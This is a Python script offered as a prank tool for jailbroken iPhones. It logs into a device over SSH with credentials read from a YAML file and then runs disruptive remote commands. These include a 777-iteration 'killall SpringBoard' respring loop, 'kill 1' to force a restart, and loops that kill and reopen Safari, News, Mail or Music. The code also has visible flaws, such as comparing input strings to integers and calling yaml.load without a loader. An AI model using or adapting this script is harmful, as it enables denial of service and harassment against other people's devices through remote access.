from os import system
import yaml
import paramiko
import time
import random
f=open('Data//Data.yaml')
data=yaml.load(f)
ip=data['ip']
port=data['port']
username=data['username']
password=data['password']
message=data['message']

client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(ip, port=port, username=username, password=password, sock=None)
system('reset')
choice = input('''The worlds first ever iOS Prank TOOL (FOr Jailbroken iOS Devices That Have OpenSSH)!

Choice 1 = Respring Loop

Choice 2 = Restart Device (Loss Of SSH Communication - Unless Fully
Jailbroken & Not Temporary Re-Jailbroke)

Choice 3 = Open INSTALLED Application Loop (May STOP Working unknown Due To My iOS
Device Having An Unknown Issues With Such Commands)

Available Application CHOICES:
*1* Safari
*2* News
*3* Mail
*4* Music

Please Enter Your CHOICE: ''')

if choice == 1:
    for i in range(777):
        client.exec_command('killall SpringBoard')
        time.sleep(0.5)
if choice == 2:
    client.exec_command('kill 1')
if choice == 3:
    system('reset')
    choice2 = input('ENTER APPLICATION #: ')
    if choice2 == 1:
        for i in range(777):
            time.sleep(0.5)
            client.exec_command('killall MobileSafari')
            time.sleep(0.5)
            client.exec_command('open com.apple.MobileSafari')
    if choice2 == 2:
        for i in range(777):
            time.sleep(0.5)
            client.exec_command('killall News')
            time.sleep(0.5)
            client.exec_command('open com.apple.News')
    if choice2 == 3:
        for i in range(777):
            time.sleep(0.5)
            client.exec_command('killall MobileMail')
            time.sleep(0.5)
            client.exec_command('open com.apple.MobileMail')
    if choice2 == 4:
        for i in range(777):
            time.sleep(0.5)
            client.exec_command('killall Music')
            time.sleep(0.5)
            client.exec_command('open com.apple.Music')